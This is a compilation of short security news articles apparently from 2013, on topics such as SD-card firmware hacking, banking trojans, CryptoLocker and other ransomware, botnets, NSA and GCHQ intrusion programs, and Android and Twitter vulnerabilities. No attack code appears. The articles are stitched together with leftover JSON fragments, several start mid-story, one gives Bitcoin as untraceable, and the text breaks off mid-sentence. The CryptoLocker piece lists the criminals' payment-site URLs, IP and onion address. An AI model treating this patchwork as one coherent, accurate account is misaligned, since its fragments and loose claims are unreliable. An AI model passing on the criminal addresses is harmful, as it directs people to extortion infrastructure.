Another interesting hack was presented at the Chaos Computer Congress (30C3), in Hamburg, Germany. The researchers demonstrated how it is possible to hack the microcontroller inside every SD and MicroSD flash cards that allow arbitrary code execution and can be used to perform a man in the middle attack. The Hardware Hackers Andrew “bunnie” Huang and Sean “xobs” described the exploitation method on their blog post,\"it also enables the possibility for hardware enthusiasts to gain access to a very cheap and ubiquitous source of microcontrollers.\" It seems that to reduce SD cards price and increase their storage capability, engineers have to consider a form of internal entropy that could affect data integrity on every Flash drive. Almost every NAND flash memory is affected by defects and presents problems like electron leakage between adjacent cells. \"Flash memory is really cheap. So cheap, in fact, that it’s too good to be true. In reality, all flash memory is riddled with defects — without exception. The illusion of a contiguous, reliable storage media is crafted through sophisticated error correction and bad block management functions. This is the result of a constant arms race between the engineers and mother nature; with every fabrication process shrinks, memory becomes cheaper but more unreliable. Likewise, with every generation, the engineers come up with more sophisticated and complicated algorithms to compensate for mother nature’s propensity for entropy and randomness at the atomic scale.\" wrote Huang. Manufacturers have a sophisticated software that can detect hardware issues, such as bad sectors, and correct them through firmware. Hackers could hack into these flash-based storage devices using firmware vulnerability, allowing them to install malware. The firmware on the SD cards can be updated, but according the Huang revelations most manufacturers leave this update functionality unsecured. During the presentation, they reverse-engineered the instruction set of a particular microcontroller to inspect firmware loading mechanism. The attackers suitably modifying the firmware could hack any device that uses the compromised SD card (e.g. A mobile device, Wi-Fi equipped camera), the flash memory will appear to be operating normally while hacking the hoisting equipment.The SD card could make a copy of the contents in a hidden memory area or it could run malicious code while idle avoiding detection mechanisms. When we speak about USB hacking or SD Card is hacking we must consider that we are approaching the hacking on a large-scale due the wide diffusion of these components. Microcontrollers cost as little as 15¢ each in quantity, they are everywhere and every device that use them could be hacked. Another consideration that must be done is that Governments and high profile hackers could be very interested in this type of attack for both cyber espionage and sabotage, arrange a countermeasure against those types of threat it is very hard. A curiosity for the \"hackers inside\"... These cards could be reprogrammed to become Arduino open source microcontroller and memory systems. “An Arduino, with its 8-bit 16 MHz microcontroller, will set you back around $20. A MicroSD card with several gigabytes of memory and a microcontroller with several times the performance could be purchased for a fraction of the price,” he writes. So, in short, destroy your SD cards if you have any dirty info on them and keep your eyes peeled for ultra-small, ultra-fast Arduino hacks. Look closely at the presentation... and distrustful of SD cards from now on." }

The financial malware's were the most popular threat this year. Money is always a perfect motivation for attackers and cyber criminals who are continually targeting financial institutions. On Tuesday, Antivirus firm Symantec has released a Threat report, called “The State of Financial Trojans: 2013”, which revealed that over 1,400 financial institutions have been targeted and compromised millions of computers around the globe and the most targeted banks are in the US with 71.5% of all analyzed Trojans. Financial institutions have been fighting against malware for the last ten years to protect their customers and online transactions from threat. Over the time the attackers adapted to these countermeasures and sophisticated banking Trojans began to emerge. According to the report, the number of infections of the most common financial Trojans grew to 337 percent in the first nine months of 2013. Nearly 1,500 institutions in 88 countries were potential targets during 2013.The financial fraud marketplace is also increasingly organized and Cyber criminals are using advanced Trojans to commit large scale attacks.Attackers of all skill levels can enter the arena of financial fraud, as the underground marketplace is a service industry that provides an abundance of resources. Those who lack expertise can simply purchase what they need. For as little as $100, an attacker can avail of a leaked Zeus or Spyeye equipped with Web-injects.The modern financial Trojan is extremely flexible, supporting a range of functionality designed to facilitate fraudulent transactions across a variety of services. Two dominant attack strategies are:Focused attack: This approach suits attackers with limited resources but also scales well to larger operations. If the distribution is accurate and the target institution has a sizeable client base, a focused attack can provide an adequate supply of targets. Shylock, Bebloh and Tilon all use this approach exclusively. Broad strokes: In this attack strategy, Trojans are set to target large numbers of institutions. Tilon, Cridex, and Gameover adopt these tactics and Zeus also uses this approach in its default configuration. According to Symantec, the main reason for the surge is weak authentication practices: Unfortunately, in many situations, security implementations adopted by financial institutions are inadequate to defend against the modern financial Trojan. Institutions are starting to adopt strong security measures like chipTAN, but the adoption rate is slow. Institutions that persist with weaker security measures will continue to be exploited by attackers.They need to maintain constant vigilance, apply software updates, maintain an awareness of new threats and deploy complementary security solutions that can defend against evolving malware attacks." }

The hacker has demanded the payoff in Bitcoin, a untraceable virtual currency, perfect for blackmailers and cyber criminals. Bitcoin is not backed by any central bank or government and can be transferred \"peer to peer\" between any two people anywhere.

Researchers did not mention that how they discovered Chewbacca, or the extent to which it has spread, but they note that the Malware is compiled with Free Pascal 2.7.1. After execution of malware on the victim's windows system, it drops as spoolsv.exe in the startup folder and also drops a copy of Tor 0.2.3.25, which runs with a default listing on \"localhost:9050\". The Trojan then logs all keystrokes and sends the data back to the botnet controllers via Tor anonymity network. The Malware also enumerates all running processes and reads their process memory. According to the researchers, The Command-and-Control server is developed using LAMP, that is based on Linux, Apache, MySQL and PHP.Chewbacca is currently not offered in public (underground) forums, like other toolkits such as Zeus. Maybe this is in development or the malware is just privately used or shared.The botnet's Command-and-Control server login page have an image of a character (ChewBacca) from the film series Star Wars.

IntelCrawler is a multi-tier intelligence aggregator, which gathers information and cyber prints from a starting big data pool of over 3, 000, 000, 000 IPv4 and over 200, 000, 000 domain names, which are scanned for analytics and dissemination to drill down to a desired result. I have prepared for them a series of answers and questions to analyze significant evolutions in the cyber-threat landscape: Q. Which are the most concerning cyber threats for private businesses and government organizations?A. Avoiding talking about usual and standard things, of course, the most dangerous and annoying is the emergence of fundamentally new vulnerabilities in critical applications and systems. \"Zero day\" vulnerabilities market is developing every day and taking the shape of a part of the future cyber warfare market, as it is still in the process of formation. Neither consumers in the face of government or companies, nor vendors are not ready for such kind of threat, which makes mitigation actions very complicated. Q. Which are the industries most exposed to cyber attacks and why?A. Just imagine, what would be interesting for you, if your main interests were money and information? It is two main reasons of all past and today's cyber attacks in the world. First of all, it is all related to profitable commercial business, such as private banking and industrial sector, ending with government infrastructures, which relates to state sponsored attacks. It is true, as cyber offensive approaches displace \"old school\", such as signal intelligence, as it is much cheaper and easier in the 21st century. The role of information takes new forms, making the computer communications as a battlefield of modern cyber warfare. Which are the factors that most of all have influenced the design of malicious code in the last year (e.g. P2P communication protocols, advanced evasion techniques, hiding C&C in Tor networks) Malware coders are interested in hiding of the communications between the infected host and C&C, that's why the stable trend is to create or to use alternative means of communications. That's why, there were lots of new kinds of samples, which used C&C in TOR or I2P, which was really exotic for the first time, but then became one of the standards for the cybercriminals. Q. Which is the role of the intelligence in the fight to the cybercrime?A. The role of e-crime intelligence is huge, as sometimes only timely notification about planned threat can help to prevent cyber attack or fraud. There are some difficulties in this niche as well, such as the heterogeneity of geographies cyber criminals live, the languages they speak, opportunity of deep infiltration in Underground communities, gathering information on the real identity of the criminals in the age of anonymity and impersonality and etc., all these aspects forcing us to organize systematical monitoring of several the most important regions, such as Asian segment, former USSR, risky EU-based countries, such as Romania, and use a large network of trusted sources. Software protection ways can't help on 100%, that's why human resources and intelligence are one of the most important additional elements. Q. Malware and Internet of things, what to expect in the next months?A. First of all, new variants of mobile malware, as it will be one of the most actual for the nearest future, because of global \"mobilization\". Secondly, new kinds of online-banking trojans and the appearance of medication of POS/ATM malicious code, as \"skimming\" becomes too expensive and risky. Thirdly, hacking and surveillance will damage your privacy more and more, as it is inseparable. Q. Does it exist a marked distinction between cybercrime and state-sponsored hacking?A. Yes, as state-sponsored hacking has more specifics. Interesting fact, that firstly cybercriminality creates the trend for further state-sponsored hacking, governments copy its actions and explore the methods and means they use in that or this country, as it is really different. Just compare, Chinese hackers and Latin American hackers, absolutely different style of intrusions, fundamentally different approaches on malicious code, as Chinese stuff is more sophisticated, because of great experience and scientific potential across the whole country. Q. Which are the governments most active in cyberspace?A. You should be very cautions talking about exact governments in cyber world, because it is still not very transparent. Good example, we have detected the C&C placed in Morocco, but the owners of the botnets who were behind using email accounts registered on GMX.DE. Another is when the malware after reverse engineering and unpacking had strings written in Hebrew, but hosted in Latvia. Despite these facts, the leaders of this industry certainly are: China, USA, Russia, Germany, France, UK, UAE and Saudi Arabia and Israel. Q. Do you think it is possible a major cyber attack against a government network or a critical infrastructure in the next year?A. Yes, as it is one of the today's main interests of bad actors, doesn't matter state sponsored or general criminals. Q. Do you think it is possible that a Stuxnet like malware is already operating on the Internet? A. You never know, but I think that the topic of embedded systems backdooring or malware distribution under PLC/RTU/SCADA is still very actual.

This is nothing new and to be expected. I have noticed many discussions on underground hacking forums about \"How to create Ransomware like Cryptolocker malware\" or \"Malware - hacking tool-kit with ransomware features\". Security intelligence provider, IntelCrawler has discovered a new ransomware variant called Locker that demands $150 (£92) to restore files that it has encrypted. Like Cryptolocker, this new ransomware is also nasty because infected users are in danger of losing their personal files forever. Locker mainly spreads by drive-by downloads from compromised websites, disguised itself as MP3 files and use system software vulnerabilities to infect the end user. Once it has infected a system, malware first checks the infected machine has an internet connection or not. Then it deletes any original files from the victim's computer after using AES-CTR for encrypting the files on infected devices and add \". perfect\" extension to them. Locker's encryption is based on an open source tool called 'TurboPower LockBox' library. After encrypting all files, the malware place a \"CONTACT.TXT\" file in each directory, which provides contact details of the author to buy the decryption key and once the ransom is paid, each victim gets a key to unscramble files. The good news is that the researchers are working on the universal decryption software in order to help the victims. \"It appears that the hackers are simply comparing the list of infected IP addresses of users, along with their host names,\" according IntelCrawler. IntelCrawler had discovered 50 different builds of the malware, which are being sold in underground markets for pay-per install programs. One builds had just under 6,000 infected machines. ZdNet reported. Malware will encrypt all drives visible on an infected system, so you must be sure that your backups are stored remotely or in a location that is not simply another drive partition or mapping to another location. The malware infects users from the United States, Turkey, Russia, Germany and the Netherlands. Users should remain vigilant about their security. Please double check the legitimacy of links received in emails and ensure you have your antivirus up to date to help protect against such threats." }

The Botnet was controlled from an Internet Relay Chat (IRC) server hidden behind Tor network in order to evade sinkholing. According to a press release from German police, they arrested two people suspected of illegally generating Bitcoins worth nearly $1 million using a modified version of existing malware i.e. Skynet Botnet. German police conducted raids earlier this week on 3rd December and found evidence of other hacking activities i.e. Fraud and distribution of copyrighted pornographic material. A third person is under suspicion but has not been arrested. However, Police didn't mention Skynet Botnet in their press release, but just a day after the arrest, Thomas Siebert - Security Researcher at G DATA has also confirmed that the Skynet Botnet authors were arrested by the German Police on 3rd December, 2013. On 6th December, twitter account of Skynet author tweeted:'You have the wrong guy. Use this tweet as evidence to do the right thing and release him.'According to MalwareTech blog post, 'It would seem the tweet is an automated message or he requested a friend post it in the event of his arrest.'Last year, hacker on a Reddit post described that they have successfully compromised more than 15,000 systems and once infected, the malware downloads Bitcoin miners, exploit computational resources of the victim system and uses them in the mining process.“My Botnet only mines if the computer is unused for 2 minutes and if the owner gets back it stops mining immediately, so it doesn't suck your fps at MW3. Also its mines as low priority so movies don't lag. I also set up a very safe threshold, the cards work at around 60% so they don't get overheated and the fans don't spin as crazily.”A Botnet network behind the Tor network makes it much harder for researchers and law enforcement agencies to identify the malware operators and to shut down the server.

Every day numerous friends ask me if it is possible to steal WhatsApp chat messages and how, of course a malware represents an excellent solution to the request. In the past I already posted an article on the implementation of encryption mechanisms for WhatsApp application explaining that improper design could allow attackers to snoop on the conversation. Spreading the malware through an official channel the attacker could improve the efficiency of the attack, and it is exactly what is happening, an Android game has been published on the official Google Play store to stealthy steal users’ WhatsApp conversation databases and to resell the collection of messages on an internet website. The games titled “Balloon Pop 2” has been fortunately identified and removed from the official Google Play store, it was able to spy on conversations made via WhatsApp and upload them to the WhatsAppCopy website. On the WhatsAppCopy website is advertised the Android game BalloonPop2 as a way of “backing up” a device’s WhatsApp conversation, it's very curious, what do think about? The website managers sustain that their app is a legitimate game that could be used to back up WhatsApp messages, they aren't responsible for its abuse for spying purposes. The attacker paying a fee could view the stolen WhatsApp conversations from the WhatsAppCopy website, it is necessary to provide the phone number of the targeted Android device to read the private messages exchanged by the victims. The message posted on the website states:\"Execute our game on a mobile, whatsapp conversations are sent to this website, an hour later looking for the phone, and you can read the conversations .\"Despite the application has been immediately removed from the Google Play store there is the concrete risk that ill-intentioned will continue to distribute it through unofficial stores. The rapid diffusion of mobile platforms and lack of defense mechanisms on almost every device make them a privileged target, the number of malicious code designed for Android and iOS is literally exploded in the next years. Cyber criminals have also exploited official channel to spread malicious code, it is happening to the mobile version of the popular Carberp banking trojan. The fact that an app has been published on official store it isn't sufficient to consider it reliable and secure, same consideration is valid for other mobile platforms.

Here we have something shocking update that Some German Scientists have developed a proof of concept Malware prototype, could allow a hacker to infect your computers and other digital devices just using Inaudible Audio signals. The ability to bridge an air gap could be a potent infection vector. Just imagine, a cyber attack using high-frequency sound waves to infect machines, where stolen data also can be transferred back to attacker without a network connection, Sounds very terrifying ? When a few weeks ago, a security researcher Dragos Ruiu claimed malware dubbed badBIOS allowed infected machines to communicate using sound waves alone, means that the devices are physically disconnected from any networks, including the internet, people said he was crazy.But Now German Researchers have published a paper on how malware can be designed to cross the air gap by transmitting information through speakers and recording it via microphone. Rather than relying on TCP-IP, they used a network stack originally developed for underwater communication and the signal was propagated through the use of a software-defined modem based on the GNU Radio project. In a scenario based hacking, “The infected victim sends all recorded keystrokes to the covert acoustical mesh network. Infected drones forward the keystroke information inside the covert network till the attacker is reached, who is now able to read the current keyboard input of the infected victim from a distant place.” paper explained.In another scenario, the researchers used sound waves to send keystroke information to a network-connected computer, which then sent the information to the attacker via email. While the research doesn’t prove Dragos Ruiu’s badBIOS claims, but it does show that even if the system is disconnected from any network, could still be vulnerable to attackers. However, I would like to appreciate Dragos dedication about badBIOS research because this extraordinary concept was first introduced by him only. Researchers POC Malware is able to transfer data at 20 bits per second only, which is very low, but that's still capable of transferring your password or credit card number to the hacker in a few seconds. Some basic countermeasures one can adopt to protect against such malware are:Switching off the audio input and output devices from the system. Employ audio filtering that blocks high-frequency ranges. Using an Audio Intrusion Detection Guard. Lets see how Antivirus companies will handle such threats to protect home users." }

It is based on proof-of-concept code released in late October and it helps spread malware by exploiting a vulnerability in php-cgi. \"Upon execution, the worm generates IP addresses randomly, accesses a specific path on the machine with well-known ID and passwords, and sends HTTP POST requests, which exploit the vulnerability.

It specifically targets system information, online credentials, and banking details, but can be customized through the toolkit to gather any sort of information. The email is sent from the spoofed address “Skype Communications” and seems to be genuine, it has similar body content and the official Skype logo that usually comes with a legitimate Skype voice mail alerts.“This is an automated email, please don’t reply. Voice Message Notification. You received a new message from the Skype voice mail service.” the email reads. The fraudsters have also tried to make the emails look genuine by adding real links back to the Skype website.

Yesterday, a Dutch newspaper has published a new secret NSA document provided by former intelligence employee Edward Snowden. According to the newly exposed slide, NSA has infected more than 50,000 computer networks worldwide with software designed to steal sensitive information i.e. Malware. The slide from the NSA's 2012 management presentation, shows a world map with more than 50,000 targeted locations, uses a procedure called ‘Computer Network Exploitation’ (CNE) that can secretly install malware in computer systems. The malware can be controlled remotely and be turned on and off at will. From the NSA website we found that, CNE includes enabling actions and intelligence collection via computer networks that exploit data gathered from target or enemy information systems or networks. \"Cyberwar is a very real threat and could cause widespread problems. That is why the National Security Agency needs to be prepared by Computer Science professionals who are highly-skilled in Computer Network Operations.\" The website says. To perform such offensive attacks via CNE operations, NSA has employed more than a thousand hackers under a special unit called TAO (Tailored Access Operations). Countries targeted by the CNE hackers unit includes China, Russia, Venezuela and Brazil. Many Counties now have their own Cyber units - including China and Dutch, but their actions are prohibited by law. Officially they cannot perform operations as the NSA and GCHQ can do." }

Just last week, The UK National Crime Agency urge people afflicted by CryptoLocker not to pay ransom, not least because there is no guarantee that they will even receive an unlock key. Not even Police departments are immune to CryptoLocker. In November second week, Massachusetts' Swansea Police Department paid a 2 Bitcoin ($750 that time) ransom to decrypt images and Word documents encrypted by CryptoLocker ransomware. \"It gave us 100 hours to pay and it was literally a timer,\" said Police Department. \"A big red screen comes up with a timer that says you have 100 hours to pay or your files will be encrypted forever.\" Malware usually distributed through spam emails, encrypting the user's files on the infected machine and also the local network it is attached to. However, Police Department said the virus did not affect the software that the police use in reports or booking. Security experts also commented that \"The only reason this type of attack success is because people are willing to pay up. If no one ever paid, there would be no ransomware.” But will they also not pay ransom for their very important files, if encrypted by malware ? Definitely everyone will, as the Police have to. Other attackers are also moving in this direction as well. There are many other ways, following that you can protect your system from CryptoLocker before infection. Ensure you have best one active and up-to-date and if a computer becomes infected it should immediately be disconnected from any networks.

The malware, dubbed as \"Java.Tomdep\" differs from other server malware and is not written in the PHP scripting language. It is basically a Java based backdoor act as Java Servlet that gives Apache Tomcat platforms malicious capabilities. Because Java is a cross platform language, the affected platforms include Linux, Mac OS X, Solaris, and most supported versions of Windows. The malware was detected less than a month ago and so far the number of infected machines appears to be low. You may think that this type of attack only targets personal computers, such as desktops and laptops, but unfortunately that isn’t true. Servers can also be attacked. They are quite valuable targets, since they are usually high-performance computers and run 24x7. Java worm seeks out for the system having Apache Tomcat installed-running and then attempts to log-in using the password brute-force attack using combinations of user names and passwords. After installation, the malware servlet behaves like an IRC Bot and able to receive commands from an attacker. Malware is capable of sending-downloading files from the system, create new processes, update itself, can setup SOCKS proxy, UDP flooding i.e. Can perform massive DDoS Attack. They have mentioned that the command-and-control servers have been traced to Taiwan and Luxembourg. In order to avoid this threat, ensure that your server and AV products are fully patched and updated." }

What makes CryptoLocker so bad is the way it encrypts the user data on your hard drive using a strong encryption method. This makes it literally impossible to access your own data without paying the ransom amount to the criminals between $100 and $300 or two Bitcoins, even now more. Once affected you will be locked out of your computer and unless you pay the ransom amount in 72 hours , the virus will delete the decryption key to decrypt all the files on your PC . The malware lands on PCs the same way other malware does and a few sensible precautions will help minimize the chances of a CrytoLocker attack. Yesterday, we reported that - UK's National Crime Agency has given out an urgent national alert that a mass spamming event targeting 10 million UK based email users with CryptoLocker. What if your computer gets compromised? Currently there is no option to decrypt the files without the decryption key and brute forcing a file encrypted with 2048 bit encryption is almost impossible. If you don’t pay the ransom, you forever lose access to everything you’ve been working on which is stored on your computer. A few things you can do to prevent your PC from getting infected with the CryptoLocker virus: Most viruses are introduced by opening infected attachments or clicking on links to malware usually contained in spam emails. Avoid opening emails and attachments from unknown sources, especially zip or rar archive files. Most people have some anti-virus program, but how do you know it’s effective? Ensure you have best one active and up-to-date. Also keep your operating system and software up-to-date. Keep a backup. If you have a real-time backup software then make sure that you first clean the computer and then restore the unencrypted version of the files. Create files in the Cloud and upload photos to online accounts like Flickr or Picasa. Windows 7 users should set up the System Restore points or, if you are using Windows 8, configure it to keep the file history. Make sure you have reformatted your hard drive to completely remove the CryptoLocker trojan before you attempt to re-install Windows and/or restore your files from a backup. There are many free tools now available in the community, that can help users to protect their systems from this malware. 1.) CryptoPrevent tool, created by American security expert Nick Shaw. This tool applies a number of settings to your installation of Windows that prevents CryptoLocker from ever executing and has been proven to work in Windows XP and Windows 7 environments. 2.) HitmanPro.Alert 2.5, a free utility that will help you to protect your computer against the CryptoLocker ransomware malware. HitmanPro.Alert 2.5 contains a new feature, called CryptoGuard that monitors your file system for suspicious operations. When suspicious behavior is detected, the malicious code is neutralized and your files remain safe from harm. 3.) BitDefender Anti-CryptoBlocker, an encryption-blocking tool that can detect and block malware from installation. Intrusion prevention systems can block the communications protocol send from the Cryptolocker infected system to the remote command-and-control server where the malware retrieves the key to encrypt the files. Blocking the communications can prevent the encryption from taking place.

But looks like the NSA isn't the only one using dirty digital tricks to hack its targets. Back in September, it was reported that the UK's equivalent of the NSA, GCHQ had hacked Belgacom, a leading telecommunications provider in Belgium. Some New analysis of the Snowden papers by German magazine Der Spiegel shows that British intelligence agency GCHQ created fake LinkedIn and Slashdot pages to spy on computers of Belgacom network engineers. Communications networks are particularly valuable to spies, because they allow instant access to individual users. Belgacom provides internet access to dozens of key EU institutions based in its capital city Brussels and its global roaming exchange is a hub for connections between various international mobile networks. GCHQ reportedly used a method called “quantum insert”, to redirect employees of Belgacom, Belgium’s largest telecommunications company, to fake websites that contained malware. According to Der Spiegel, the first step for GCHQ was to identify employees at Belgacom working in its security and maintenance divisions, including finding out which ones use LinkedIn and Slashdot. Then they redirected the intercepted traffic (using Man in the middle attack) to a spoofed server (codenamed \"Fox Acid\"), which can respond faster than the real one, is placed somewhere on the Internet backbone. The documents reveal the extent to which spy agencies are able to use mobile communications to track people down and for surveillance. One document claimed, \"We can locate, collect, exploit (in real time where appropriate) high-value mobile devices and services in a fully converged target centric manner.\" A LinkedIn spokesman told Der Spiegel, \"We were never told about this alleged activity and we would never approve of it, irrespective of what purpose it was used for.\" It’s unclear whether the GCHQ has its own version of FoxAcid or whether it just piggybacks on the NSA’s servers as per their unique surveillance cooperation relationship. Slashdot hasn't responded to a request for comment. I wonder if there is any possibility that LinkedIn and Slashdot can go after the government on legal basis for effectively attacking their servers?" }

Mobile devices are reason of great concern for governments, they have a great computational capability, huge memories to store our personal data, GPS to follow our movements and are equipped with a camera and microphone to increase our experience in mobility. The advent of monitoring apps like Mobistealth has already brought the possibility of using the aforementioned features to keep tabs on a target device irrespective of the geographic distance to light. However, it has also raised red flags over the possibility of exploitation of such features by attackers for cyber espionage. The problem is well known to governments that are adopting necessary countermeasures especially following the recent revelations about the U.S. Surveillance program. The UK Government has decided to ban iPads from the Cabinet over foreign eavesdropper fears, it has been requested Ministers to leave mobile in lead-lined boxes to avoid foreign governments to spy on top level government meetings. The news is reported by the Mail on Sunday, after the Cabinet Office minister Francis Maude made a presentation using his iPads last week (about how the Government Digital Service might save the UK £2bn a year) the Downing Street security staff has dismissed the mobile device to prevent eavesdropping of ongoing discussions. The measure was adopted to avoid that foreign security services infecting mobile devices are able to capture audio and data from victims, it is known that hostile actors like China, Russia and Iran have the ability to use mobiles in powerful spy tools. Ministers belonging to sensitive government departments were recently issued with soundproof lead-lined boxes to guard and isolate their mobile devices during official meetings. The precautions have been taken due the high concern caused by news that German Chancellor Angela Merkel's personal mobile has been spied by the NSA for years. My personal opinion it that it is not acceptable that the German Federal Intelligence Service has allowed everything, missing the adoption of appropriate protective measures like crypto mobile devices, protected landline and similar. Other governments already have approached the problem to adopt secure devices to prevent bugging and eavesdropping, the British foreign secretary William Hague confirmed his phone has been armored by GCHQ. Just a week ago it was published the news that delegates at the G20 summit in Russia received malicious computer memory sticks used to serve a malware to spy on the participants and steal sensitive information, let's remember also that the information leaked on the NSA FoxAcid platform revealed the existence of spy tool kits RADON and DEWSPEEPER able to exploit victims via USB. Herman Van Rompuy, the President of the European Council, ordered tests to be carried out on the memory sticks and the results are shocking: ‘The USB pen drives and the recharging cables were able to covertly capture computer and mobile phone data,’ a secret memo said. Overseas, the situation does not change, even the US fear that the use of the mobile devices can cause them problems, The Department of Homeland Security and FBI warn public safety departments that their out-of-date Android devices are a security risk, but updating them is not always easy or simple. The alert cited unspecified \"industry reporting\" that, \"44 percent of Android users are still using versions 2.3.3 through 2.3.7 (Gingerbread) which were released in 2011 and have a number of security vulnerabilities that were fixed in later versions.\" Google's own figures on its site for Android developers estimate that percentage at about a third less — 30.7 percent. But it also showed 21.7 percent using versions 4.0.3-4.0.4, called Ice Cream Sandwich, which is also out of date. Less than half – 45.1 percent – are using the latest OS, called Jelly Bean, and of that group, 36.6 percent are using 4.1, and only 8.5 percent are using 4.2, which is the latest OS. The DHS/FBI document address principal cyber threats to out-of-date Android mobile devices, including SMS Trojans, Rootkits and fake Google Play Domains. Despite the alert recommends regular updates, running an \"Android security suite\" and downloading apps only from the official Google Play Store, the update for Android devices can reveal several problems. \"There is a wide variety of Android OEM versions rolled out to a huge number of different handsets, and not all carriers and handset OEMs will allow you to upgrade to the latest version,\" \"So, the Android versions that can run are restricted per device. Even now it is possible to buy Gingerbread devices that cannot be upgraded to Jelly Bean.\" said Mario de Boer, research director, Security and Risk Management Strategies at Gartner for Technical Professionals. De Boer suggested that the only solution for now is to block the use of Android devices that are not running the latest OS. \"Apply admission control,\"\"If your Smartphones or tablet is running a vulnerable OS, you cannot get access to the specific service or data.\" \"this is hard to accomplish for voice and text, and easier for email and access to files.\" The principal problem related to the use of mobile devices in government environment is that almost every Smartphone is not designed following severe requirements in term of corporate or government security, let's add that wrong user's habits aggravate the situation. It needs a change or mobile devices should be excluded from sensitive contexts." }

We have warned our readers in many previous articles about a nasty piece of Ransomware malware called 'CryptoLocker', which is targeting computers running the Microsoft Windows operating system. The CryptoLocker Ransomware encrypts the files on a victim’s computer and issues an ultimatum - Pay up or lose your data. Users who are getting infected with CryptoLocker can see a message informing them that their computer is locked up and their files encrypted. It then asks them to make a ransom payment, which typically ranges between $100 and $700 or 2 Bitcoins, to get their files back. Just yesterday I noticed on a forum that the criminals behind the CryptoLocker malware has recently launched a dedicated CryptoLocker decryption service website that allows victims to purchase the decryption key for their infected encrypted files. Interestingly, Malware inside the system is asking for only 2 Bitcoins ($450 USD) for the decryption keys, whereas the newly launched service price has been significantly increased 10 Bitcoins i.e. Approx $2,100 USD. Service is available on the website http://yocmvpiarwmfgyg.net/ or http://93.189.44.187/ (Russia based hosting server) and also accessible through the Tor network http://f2d2v7soksbskekh.onion/ Why Hackers has launched the Decryption Service ? Currently almost all antivirus companies are on Red alert about CryptoLocker malware and they have released updates for their users, that can detect and remove the infection or the registry keys from the system which is actually required to pay the ransom and decryption process. So if malware will get deleted, neither victim will get the decryption keys ever, neither criminal will get paid for it. So the criminal actors behind the CryptoLocker malware has launched the decryption service website, which is designed to look like a customer support site for victims. How the Decryption Service works ? The victim can upload one of its encrypted files on the service website, which will generate an order number. After uploading, a further order status page will display the date-time of infection and victim's public key. It will then prompt the user to purchase the private key by paying 10 Bitcoins or approximately $2,200 USD. Once a payment is made, just after the confirmation, the website will allow the user to download a decryption private key and a decrypter tool. Which can be used to decrypt all CryptoLocker encrypted files on the system. Another interesting fact about the service website is that, if the user has already paid the ransom amount, they will provide the private key and decrypter free of cost. CryptoLocker Ransomware, A Global threat CryptoLocker infections were found across different regions, including Europe Middle East, North America and Asia Pacific. Almost 64% victims are from the US. There are different ways an individual or an organization can handle the CryptoLocker threat. Unfortunately, there is no known tool to decrypt the files encrypted by CryptoLocker, so always take Backup of important Files. Always ensure your system softwares and Antivirus product is up-to-date. Antivirus firm Bitdefender has just released a tool to protect your files from CryptoLocker.

The vulnerability was also responsibly disclosed to Google back in February by Bluebox and but the company did not fix the issue even with Android 4.3 Jelly Bean. Later, Google has also modified its Play Store’s app entry process so that apps that have been modified using such exploit are blocked and can no longer be distributed via Play. Then after a few days, in the last week of July this year, Android Security Squad, the China-based group also uncovered a second Android master key vulnerability similar to the first one. Security researcher Jay Freeman has discovered yet another Master Key vulnerability in Android 4.3, which is very similar to the flaw reported by Android Security Squad in July. Jay Freeman, perhaps better known as Saurik for Cydia Software, an application for iOS that enables a user to find and install software packages on jailbroken iOS Apple devices such as the iPhone. He demonstrated the flaw with a proof of concept exploit, written in Python language. On Android, all applications are signed by their developers using private cryptographic keys; it is by comparing the certificates used to verify these signatures that Android's package manager determines whether applications are allowed to share information, or what permissions they are able to obtain. Even the system software itself is signed by the manufacturer of the device and the applications signed by that same key are thereby able to do anything that the system software can. Like the previous master key bugs, Saurik's exploit allows a hacker to gain complete access to your Android device via a modified system APK, with its original cryptographic key being untouched. This way the malware can obtain full access to Android system and all applications (and their data) with dangerous system permissions. Users are advised to download apps or app updates only from trusted sources, preferably from official sources or app stores. Saurik has also updated his Cydia Impactor for Android to include a patch for this bug. Recently, the source code for Android 4.4 was released in Android Open Source Project, which included a patch for all previously known Android Master Key vulnerabilities. Update: We have updated the story, and made some correction after Saurik comment, 'the bug I am describing is a bug in Android 4.3, not Android 4.4. The fix for it was included in the code release for Android 4.4, and since it is now disclosed there is no harm to the open device community to describe the bug in public; devices that currently have no exploit are there by now exploitable.' Thank you!" }

Finland's foreign minister said, \"I can confirm there has been a severe and large hacking in the ministry's data network,\" A large scale spying attack targeted the communications between Finland and the European Union using a malware, similar to, and more sophisticated than Red October. The breach was uncovered during the early part of this year. MTV3 also mentioned that the breach was not discovered by the Finns themselves, but from a foreign tip-off reported to CERT.FI. Further the Finnish authorities kept the information under wraps for continuing the forensics. There are indications that information with the lowest level security classification has been compromised, he said. In January, 2013, we had reported about Red October Cyber-espionage operation that targeted the computer networks of various international diplomatic service agencies. According security experts from Kaspersky Lab, the cyber-espionage campaign was started since 2007 and is still active. It is possible that Red October has been just one campaign from the same actor, and there could be others that haven't been discovered yet. According to experts, Red October's exploits appear to have Chinese origins, whereas the malware modules may have a Russian background. So if this Finnish malware attack somewhere linked to Red October, then Russia and China are suspected of responsibility for the snooping. Red October malware was sent via a spear-phishing email and has been tempting its targets into letting it exploit a number of relatively minor security vulnerabilities in programs such as Microsoft's Excel and Word, as well as poisoned PDFs and Java exploits. Besides Finland, other countries could be the victim of the same attack. The Finnish Security Intelligence Service is investigating the matter." }

When an application does not validate or improperly validates file types before uploading files to the system, called Unrestricted File upload vulnerability. Such flaws allow an attacker to upload and execute arbitrary code on the target system which could result in execution of arbitrary HTML and script code or system compromise. According to Ebrahim, when a developer creates a new application for Twitter i.e. dev.twitter.com - they have an option to upload an image for that application. While uploading the image, the Twitter server will check for the uploaded files to accept certain image extensions only, like PNG, JPG and other extensions won’t get uploaded. But in a Video Proof of Concept he demonstrated that, a vulnerability allowed him to bypass this security validation and an attacker can successfully upload .htaccess and .PHP files to twimg.com server. Twimg.com is working as a CDN (content delivery network) which mean that every time attacker will upload a file, it will be hosted on a different server or subdomain of twimg.com. In CDN's usually scripting engines are not allowed to run. So, in normal scenarios a successful Exploitation of uploading htaccess & PHP files to a server that supports the PHP i.e. Remote Code Execution on that server. But in the case of Twitter: Vulnerability could be used to make twimg.com as a Botnet Command server by hosting a text file with commands, so infected machines would connect to that file to take its commands. Since twimg.com is a trusted domain by users so it won’t grab the attention. For hosting of malicious files. At least it could be used to upload a text page with a defacement content and then add the infected sub-domains of twimg.com as a mirror to Zone-h.org which would affect the reputation of Twitter. Twitter recognized the criticality of the Unrestricted File Upload Vulnerability and added Hegazy name to their Hall of Fame. I personally reached Ebrahim Hegazy that revealed me that he has also found an Open redirection Vulnerability in Twitter on 15th Sept. that has also been fixed. I conclude with a personal consideration, it's shame Twitter hasn't a 